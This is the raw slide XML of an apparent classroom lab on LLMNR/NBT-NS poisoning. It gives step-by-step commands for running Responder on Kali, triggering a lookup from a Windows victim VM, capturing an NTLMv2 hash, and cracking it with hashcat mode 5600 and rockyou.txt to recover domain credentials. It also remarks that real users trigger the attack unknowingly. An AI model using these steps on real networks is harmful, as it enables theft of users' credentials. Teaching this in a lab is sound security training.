                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Think of it like this “</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>I don’t know the IP… let me shout in the network and ask everyone</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
              <a:latin typeface="Calibri Light" panose="020F03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700" dirty="0"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STEP 3 — TRIGGER (IN LAB)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700" dirty="0">
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Method 1 On victim machine (Windows):</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
              <a:latin typeface="Arial Unicode MS"/>
              <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
            </a:endParaRP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700" dirty="0"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\\fake-share</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1700" dirty="0"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700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>OR</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1700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700" dirty="0"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\\randomname</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" b="1" dirty="0"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700" dirty="0"/>
              <a:t>👉 This is </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0"/>
              <a:t>just to generate traffic</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t> so you can see:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>LLMNR request </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>Responder poisoning </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>Hash capture </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1700" b="1" dirty="0"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1700" dirty="0">
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p: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321199F-16F7-86F6-04AA-ADAA27C41C40}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6027176" y="228600"/>
            <a:ext cx="6164824" cy="4611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800" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>What happens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800" dirty="0"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Victim → broadcasts: "who is fake-share?"</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0"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</a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0"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Kali (Responder) → "I am fake-share"</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0"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</a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0"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Victim → sends NTLM authentication</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0"/>
              <a:t> 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800" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Method 2 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>From a compromised shell (more realistic)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800" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>If you already have access:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
              <a:latin typeface="Arial Unicode MS"/>
            </a:endParaRP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800" dirty="0" err="1">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>dir</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:hlinkClick r:id="rId2" action="ppaction://hlinkfile"/>
              </a:rPr>
              <a:t>\\fake-share</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1800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1800" dirty="0"/>
              <a:t>In real networks, YOU DON’T TRIGGER IT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800" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>You just: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800" dirty="0" err="1">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>sudo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> responder -I eth0 -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0" err="1">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>dwv</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1800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800" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>…and wait.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="10497949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-1" y="0"/>
            <a:ext cx="5442155" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="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700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>💥 Why?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="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700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Because users ALREADY do this:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="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700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>•	Typo:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="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700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>\\fileservr</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="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700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>•	Broken script:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="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700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>\\backup-srv</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="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700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>       Misconfigured GPO </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="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700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>       Old mapped drives </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="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700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>So in reality:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="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700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>👉 The network itself generates the traffic</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="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700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>👉 Users trigger the attack unknowingly</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="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700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Method 3 Go to Windows Victim (VM) (Preferred)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="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700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>👉 Open the Windows machine (your victim)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="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700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Do this on the Windows machine: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600" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Press: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600" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Win + R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600" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Then type:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="17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C813DCC-4FE0-494B-7DE6-B63E2EE09B1A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5267714" y="-104969"/>
            <a:ext cx="6120580" cy="54513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800" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>\\fake-share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800" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Press Enter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800" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>✔ That’s it.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800" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>✔ This is the required trigger for your task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800" dirty="0"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STEP 4 — CAPTURE HASH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800" dirty="0">
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>In Responder output you will see:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
              <a:latin typeface="Arial Unicode MS"/>
              <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
            </a:endParaRP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800" dirty="0"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[SMB] NTLMv2-SSP Hash captured</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0"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</a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0"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Username: user1</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0"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</a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0"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Domain: LAB</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0"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</a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0"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Hash: user1::LAB:...</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1800" dirty="0"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800" dirty="0"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THIS IS YOUR TARGET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800" dirty="0"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NTLMv2 hash</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0"/>
              <a:t>  Ensure NTLMv2 is captured (preferred target)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
              <a:latin typeface="Calibri Light" panose="020F03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800" dirty="0"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user1::LAB:...</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0"/>
              <a:t> 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BB0D348C-ECF8-F6BA-AF6E-D5AFB1F8DE9D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5442154" y="5241426"/>
            <a:ext cx="5946140" cy="1459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643128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" y="0"/>
            <a:ext cx="5895668" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/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700" dirty="0"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STEP 5 — SAVE HASH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700" dirty="0">
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Copy it into file:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1700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700" dirty="0" err="1"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nano</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0"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 hash.txt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1700" dirty="0"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700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Paste:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2E74B5"/>
                </a:solidFill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1700" dirty="0">
              <a:solidFill>
                <a:srgbClr val="2E74B5"/>
              </a:solidFill>
              <a:latin typeface="Calibri Light" panose="020F03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1700" dirty="0">
              <a:solidFill>
                <a:srgbClr val="2E74B5"/>
              </a:solidFill>
              <a:latin typeface="Calibri Light" panose="020F03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1700" dirty="0">
              <a:solidFill>
                <a:srgbClr val="2E74B5"/>
              </a:solidFill>
              <a:latin typeface="Calibri Light" panose="020F03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1700" dirty="0">
              <a:solidFill>
                <a:srgbClr val="2E74B5"/>
              </a:solidFill>
              <a:latin typeface="Calibri Light" panose="020F03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700" dirty="0"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STEP 6 — CRACK HASH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700" dirty="0" err="1"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hashcat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0"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 -m 5600 hash.txt /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0" err="1"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usr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0"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/share/wordlists/rockyou.txt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1700" b="1" dirty="0"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700" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> Mode 5600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1700" b="1" dirty="0"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700" dirty="0"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NTLMv2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0"/>
              <a:t> =</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>A Windows authentication protocol (challenge-response based)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800" b="1" dirty="0"/>
              <a:t>🔐 Simple idea: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800" dirty="0"/>
              <a:t>When a user connects to a share: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800" dirty="0">
                <a:highlight>
                  <a:srgbClr val="000000"/>
                </a:highlight>
              </a:rPr>
              <a:t>❌ Windows does NOT send the password</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:highlight>
                  <a:srgbClr val="000000"/>
                </a:highlight>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:highlight>
                  <a:srgbClr val="000000"/>
                </a:highlight>
              </a:rPr>
              <a:t>✔ It sends a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0">
                <a:highlight>
                  <a:srgbClr val="000000"/>
                </a:highlight>
              </a:rPr>
              <a:t>cryptographic response (hash)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
              <a:solidFill>
                <a:srgbClr val="2E74B5"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="000000"/>
              </a:highlight>
              <a:latin typeface="Calibri Light" panose="020F03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1700" dirty="0">
              <a:solidFill>
                <a:srgbClr val="2E74B5"/>
              </a:solidFill>
              <a:latin typeface="Calibri Light" panose="020F03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4F9877B-D032-C06B-ACBE-C9447FF760A8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:srcRect t="30829"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="74930" y="1628076"/>
            <a:ext cx="6021070" cy="149426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1D326BB-3754-E19F-D03E-E8EFB4D064F3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6096000" y="5229924"/>
            <a:ext cx="4869815" cy="1494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251097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FB64E6-E67F-297E-4FB2-322A210D0B27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838200" y="1253331"/>
            <a:ext cx="10515600" cy="50358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800" dirty="0"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STEP 7 — RESULT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800" dirty="0"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user1 : Password123</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1800" dirty="0"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800" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Segoe UI Symbol" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>👉</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> You now have:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1800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800" dirty="0"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VALID DOMAIN CREDENTIALS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
              <a:solidFill>
                <a:srgbClr val="2E74B5"/>
              </a:solidFill>
              <a:latin typeface="Calibri Light" panose="020F03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800" dirty="0">
                <a:latin typeface="Calibri Light" panose="020F0302020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Segoe UI Symbol" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>⚔</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0"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️ FULL FLOW (CLEAN)</a:t>
            </a:r>
          </a:p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AutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0"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Start Responder</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0"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</a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0"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2. Wait for traffic</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0"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</a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0"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3. Trigger LLMNR request</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0"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</a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0"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4. Capture NTLM hash</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0"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</a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0"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5. Save hash</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0"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</a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0"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6. Crack with </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0" err="1"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Hashcat</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0"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</a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0"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7. Get credentials</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0"/>
              <a:t> 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59181708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dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2E74B5"/>
                </a:solidFill>
                <a:latin typeface="Calibri Light" panose="020F0302020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Segoe UI Symbol" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>⚠</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2E74B5"/>
                </a:solidFill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️   COMMON PROBLEMS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b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Segoe UI Symbol" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>❌</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" b="1" dirty="0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altLang="en-US" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>No hashes captured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dirty="0"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→ No traffic triggered</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US" dirty="0"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</a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0"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→ Wrong interface</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US" dirty="0"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</a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0"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→ LLMNR disabled</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" b="1" dirty="0"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b="1" dirty="0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Segoe UI Symbol" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>❌</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" b="1" dirty="0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altLang="en-US" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Only NTLMv1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dirty="0"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→ Older system (easier to crack)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="2E74B5"/>
              </a:solidFill>
              <a:latin typeface="Calibri Light" panose="020F03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dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Calibri Light" panose="020F0302020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Segoe UI Symbol" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>🎯</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill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FINAL ANSWER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dirty="0">
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>You must:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US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dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Segoe UI Symbol" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>✔</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0"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 Run responder</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US" dirty="0"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</a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Segoe UI Symbol" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>✔</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0"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 Wait for broadcast</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US" dirty="0"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</a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Segoe UI Symbol" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>✔</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0"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 Capture NTLM hash</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US" dirty="0"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</a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Segoe UI Symbol" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>✔</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0"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 Crack with </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0" err="1"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Hashcat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0"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 (-m 5600)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="2E74B5"/>
              </a:solidFill>
              <a:latin typeface="Calibri Light" panose="020F03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805253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2880" y="0"/>
            <a:ext cx="12009120" cy="6858000"/>
          </a:xfrm>
